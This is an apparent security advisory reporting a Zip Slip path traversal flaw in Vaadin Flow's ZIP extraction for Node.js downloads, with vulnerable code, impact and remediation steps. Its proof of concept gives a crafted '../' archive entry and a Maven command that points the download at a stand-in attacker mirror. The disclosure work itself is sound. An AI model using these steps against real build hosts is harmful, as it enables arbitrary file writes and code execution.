# Zip Slip Path Traversal in Vaadin Flow DefaultArchiveExtractor

## Summary

Vaadin Flow automatically downloads and unpacks frontend toolchains (such as Node.js) when preparing a project. The default ZIP extraction helper used in this workflow fails to validate ZIP entry names before writing files, enabling crafted archives to escape the intended extraction directory. An attacker controlling the download source can therefore write files to arbitrary paths on the build host, leading to remote code execution in typical developer and CI environments.

- **Affected component:** `com.vaadin.flow.server.frontend.installer.DefaultArchiveExtractor#extractZipArchive`
- **Introduced in:** Vaadin Flow 24.3 (class annotated with `@since 24.3`)
- **Tested on:** main branch `25.0-SNAPSHOT` (commit current as of 2025-02-XX)
- **Severity:** Critical (arbitrary file write → code execution)

## Product

- **Vendor:** Vaadin Ltd.
- **Product:** Vaadin Flow
- **Affected versions:** 24.3.0 through present (25.0-SNAPSHOT at time of discovery)
- **Fixed version:** None (unpatched as of report submission)

## Technical Details

The Node installer (`com.vaadin.flow.server.frontend.installer.NodeInstaller`) relies on `DefaultArchiveExtractor` to unpack Node.js distributions. ZIP archives are handled by:

```java
ZipEntry entry = entries.nextElement();
final File destPath = new File(destinationDirectory 
        + File.separator + entry.getName());
prepDestination(destPath, entry.isDirectory());
copyZipFileContents(zipFile, entry, destPath);
```

No canonical-path verification is performed. If `entry.getName()` contains sequences such as `../../..`, the resulting `destPath` points outside `destinationDirectory`. `prepDestination` blindly creates the parent directories, and `copyZipFileContents` writes attacker-supplied data to disk with the caller's privileges.

While TAR/GZIP extraction in the same class performs canonical checks (`destPath.getCanonicalPath()`), the ZIP branch omits this safeguard, making ZIP-based distributions exploitable.

The installer downloads both the archive and its `SHASUMS256.txt` from the same `nodeDownloadRoot`, so a malicious mirror can supply matching checksums and bypass integrity verification.

## Impact

An attacker who can influence the Node.js download endpoint (e.g., compromised internal mirror, malicious dependency repository, or man-in-the-middle on HTTP) can drop arbitrary files anywhere writable by the build user. Common impacts include:

- Planting shell scripts in startup locations (`~/.bashrc`, CI job hooks)
- Overwriting project build artifacts to gain execution
- Implanting SSH keys or modifying application source

This results in remote code execution on developer workstations and continuous integration runners.

## Proof of Concept

1. Host a malicious Node.js ZIP on an HTTP server (or alter the configured mirror). Include an entry such as `../../../../tmp/owned.sh` containing a payload.
2. Provide a forged `SHASUMS256.txt` matching the malicious archive.
3. Configure a Vaadin project to use the malicious mirror, e.g.:
   ```shell
   mvn -Dvaadin.node.download.root=http://attacker/mirror/ vaadin:prepare-frontend
   ```
4. When Vaadin runs `NodeInstaller`, the extractor writes `owned.sh` outside the installation directory (e.g., `/tmp/owned.sh`). The payload executes when invoked, demonstrating arbitrary file write and potential code execution.

## Suggested Remediation

1. Introduce canonical path validation in `extractZipArchive`, mirroring the TAR branch:
   - Resolve `destPath.getCanonicalPath()`
   - Verify it starts with the destination directory's canonical path
   - Reject entries containing absolute paths or directory traversals
2. Optionally, reject zero-length names and normalize Windows drive-prefixed paths.
3. Consider adopting a hardened ZIP extraction library or sharing a common validation helper between archive types.
4. Document the vulnerability and release patched builds (24.x and 25.x lines).

## Timeline

- **2025-02-XX** – Vulnerability discovered during internal audit.
- **2025-02-XX** – Advisory prepared for disclosure and CVE request.

## Credits

- **Discoverer:** s1ain (independent security researcher)

## References

- Affected source: `flow-server/src/main/java/com/vaadin/flow/server/frontend/installer/DefaultArchiveExtractor.java`
- Call chain: `NodeInstaller.installNode()` → `extractFile()` → `archiveExtractor.extract()`

